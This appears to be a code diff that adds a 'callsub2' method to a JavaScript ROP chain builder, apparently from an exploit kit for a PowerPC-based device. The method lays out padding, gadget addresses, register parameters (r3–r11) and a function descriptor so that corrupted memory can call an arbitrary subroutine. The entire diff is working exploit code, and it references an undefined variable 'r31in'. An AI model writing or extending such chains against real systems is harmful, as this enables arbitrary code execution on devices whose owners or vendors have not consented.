@@ -260,6 +260,86 @@ class ChainBuilder {
 		return this;
 	}
 	
+	callsub2(sub, toc, r3 = 0, r4 = 0, r5 = 0, r6 = 0, r7 = 0, r8 = 0, r9 = 0, r10 = 0, r11 = 0) {
+		var AA = unescape("\u4141"), SF = unescape("\u5346");
+		
+		this.dataOffsets['opd'] = this.getDataCurrentOffset();
+		this.appendData(
+			Util.int32(sub)
+			+ Util.int32(toc)
+		);
+		
+		this.appendChain(
+		    //////////
+		
+		    // Read parameters
+			Util.pad(0x10, SF)
+			+ Util.int64(0x0, this.offsets.gadgetMod2)
+			+ Util.pad(0x60, AA)
+			+ Util.int64(0x0, this.gtemp)
+			
+			//////////
+			
+			+ Util.pad(0x10, SF)
+			+ Util.int64(0x0, this.offsets.gadgetMod1)
+			+ Util.pad(0x5C, AA)
+		);
+		
+		this.appendChainParamInt32(r11);
+		this.appendChainParamInt32(r10);
+		this.appendChainParamInt32(r8);
+		this.appendChainParamInt32(r7);
+		this.appendChainParamInt32(r6);
+		this.appendChainParamInt32(r5);
+		this.appendChainParamInt32(r4);
+		
+		this.appendChain(
+			Util.pad(0x4, AA)
+		);
+		
+		this.appendChainParamInt32(r9);
+		
+		this.appendChain(
+			Util.pad(0x20, AA)
+		);
+		
+		this.appendChainParamInt64(r3);
+		
+		this.appendChain(
+		    //////////
+			
+			// Read r3
+			Util.pad(0x10, SF)
+			+ Util.int64(0x0, this.offsets.gadgetMod2)
+			+ Util.pad(0x60, AA)
+			+ Util.int64(0x0, r31in)
+		
+			//////////
+			
+			// Read opd
+			+ Util.pad(0x10, SF)
+			+ Util.int64(0x0, this.offsets.gadgetZMod1)
+			+ Util.pad(0x60, AA)
+			+ Util.int64(0xffffffff, 0xffffffff)
+			+ Util.int32(0x0)
+		);
+		
+		this.appendChainDataOffset(this.dataOffsets['opd']);
+		
+		this.appendChain(
+			Util.pad(0x48, AA)
+			
+			//////////
+			
+			// Go to sub
+			+ Util.pad(0x10, SF)
+			+ Util.int64(0x0, this.offsets.gadgetZMod2)
+			+ Util.pad(0x58, AA)
+	    );
+		
+		return this;
+	}
+	
 	
 	///////////////////////////////////////
 	// Private: Data
